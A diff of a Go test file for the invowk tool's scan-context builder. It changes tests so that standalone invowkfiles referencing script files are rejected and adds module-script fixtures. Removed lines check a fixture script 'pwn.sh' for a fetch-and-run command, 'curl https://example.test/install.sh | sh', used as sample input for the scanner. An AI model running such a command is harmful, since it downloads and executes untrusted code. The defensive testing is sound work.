@@ -18,6 +18,8 @@ import (
 	"github.com/invowk/invowk/pkg/types"
 )
 
+const scanContextModuleScriptContent = "echo module-script\n"
+
 type cancelAfterDoneContext struct {
 	context.Context
 	done        chan struct{}
@@ -261,7 +263,7 @@ func TestReadScriptFileFactsAllowsResolvedModuleBoundary(t *testing.T) {
 	}
 }
 
-func TestBuildScanContextStandaloneFileScriptUsesInvowkfileDirectory(t *testing.T) {
+func TestBuildScanContextStandaloneFileScriptRejected(t *testing.T) {
 	root := t.TempDir()
 	otherDir := t.TempDir()
 	t.Chdir(otherDir)
@@ -278,7 +280,7 @@ func TestBuildScanContextStandaloneFileScriptUsesInvowkfileDirectory(t *testing.
 	if err := os.WriteFile(invowkfilePath, []byte(`cmds: [{
 	name: "install"
 	implementations: [{
-		script: "scripts/pwn.sh"
+		script: {file: "scripts/pwn.sh"}
 		runtimes: [{name: "native"}]
 		platforms: [{name: "linux"}]
 	}]
@@ -292,15 +294,83 @@ func TestBuildScanContextStandaloneFileScriptUsesInvowkfileDirectory(t *testing.
 		t.Fatalf("BuildScanContext() error = %v", err)
 	}
 	scripts := sc.AllScripts()
-	if len(scripts) != 1 {
-		t.Fatalf("scripts = %d, want 1", len(scripts))
+	if len(scripts) != 0 {
+		t.Fatalf("scripts = %d, want 0 for invalid standalone script.file", len(scripts))
 	}
-	if !strings.Contains(scripts[0].Content(), "curl https://example.test/install.sh | sh") {
-		t.Fatalf("script content = %q, want standalone file content", scripts[0].Content())
+	if len(sc.invowkfiles) != 1 {
+		t.Fatalf("sc.invowkfiles = %d, want 1", len(sc.invowkfiles))
 	}
-	if scripts[0].ScriptPath != types.FilesystemPath(filepath.Join(scriptDir, "pwn.sh")) {
-		t.Fatalf("ScriptPath = %q, want %q", scripts[0].ScriptPath, filepath.Join(scriptDir, "pwn.sh"))
+	if sc.invowkfiles[0].ParseErr == nil {
+		t.Fatal("ParseErr = nil, want standalone script.file rejection")
 	}
+	if !strings.Contains(sc.invowkfiles[0].ParseErr.Error(), "script file requires module invowkfile") {
+		t.Fatalf("ParseErr = %v, want script.file module-only rejection", sc.invowkfiles[0].ParseErr)
+	}
+}
+
+func TestBuildScanContextModuleFileScriptAccepted(t *testing.T) {
+	t.Parallel()
+
+	modulePath := createModuleFileScriptFixture(t)
+	assertBuildScanContextModuleFileScript(t, "module directory", types.FilesystemPath(modulePath), modulePath)
+	assertBuildScanContextModuleFileScript(t, "module invowkfile.cue", types.FilesystemPath(filepath.Join(modulePath, "invowkfile.cue")), modulePath)
+	assertBuildScanContextModuleFileScript(t, "module invowkmod.cue", types.FilesystemPath(filepath.Join(modulePath, "invowkmod.cue")), modulePath)
+}
+
+func createModuleFileScriptFixture(t *testing.T) string {
+	t.Helper()
+
+	modulePath := filepath.Join(t.TempDir(), "com.example.audit.invowkmod")
+	if err := os.MkdirAll(filepath.Join(modulePath, "scripts"), 0o755); err != nil {
+		t.Fatalf("MkdirAll(module scripts) error = %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(modulePath, "invowkmod.cue"), []byte(`module: "com.example.audit"
+version: "1.0.0"
+`), 0o644); err != nil {
+		t.Fatalf("WriteFile(invowkmod.cue) error = %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(modulePath, "scripts", "run.sh"), []byte(scanContextModuleScriptContent), 0o644); err != nil {
+		t.Fatalf("WriteFile(script) error = %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(modulePath, "invowkfile.cue"), []byte(`cmds: [{
+	name: "run"
+	implementations: [{
+		script: {file: "scripts/run.sh"}
+		runtimes: [{name: "virtual"}]
+		platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
+	}]
+}]
+`), 0o644); err != nil {
+		t.Fatalf("WriteFile(invowkfile.cue) error = %v", err)
+	}
+
+	return modulePath
+}
+
+func assertBuildScanContextModuleFileScript(t *testing.T, name string, target types.FilesystemPath, modulePath string) {
+	t.Helper()
+
+	t.Run(name, func(t *testing.T) {
+		t.Parallel()
+
+		sc, err := BuildScanContext(t.Context(), target, config.DefaultConfig(), false)
+		if err != nil {
+			t.Fatalf("BuildScanContext() error = %v", err)
+		}
+		scripts := sc.AllScripts()
+		if len(scripts) != 1 {
+			t.Fatalf("scripts = %d, want 1", len(scripts))
+		}
+		if !scripts[0].IsFile {
+			t.Fatal("script IsFile = false, want true")
+		}
+		if scripts[0].ModulePath != types.FilesystemPath(modulePath) {
+			t.Fatalf("ModulePath = %q, want %q", scripts[0].ModulePath, modulePath)
+		}
+		if scripts[0].Content() != scanContextModuleScriptContent {
+			t.Fatalf("script content = %q, want %q", scripts[0].Content(), scanContextModuleScriptContent)
+		}
+	})
 }
 
 func TestScanContextAllScriptsReturnsDeepCopies(t *testing.T) {
@@ -599,7 +669,7 @@ version: "1.0.0"
 	if err := os.WriteFile(filepath.Join(moduleDir, "invowkfile.cue"), []byte(`cmds: [{
 	name: "`+cmdName+`"
 	implementations: [{
-		script: "echo test"
+		script: {content: "echo test"}
 		runtimes: [{name: "native"}]
 		platforms: [{name: "linux"}, {name: "macos"}]
 	}]
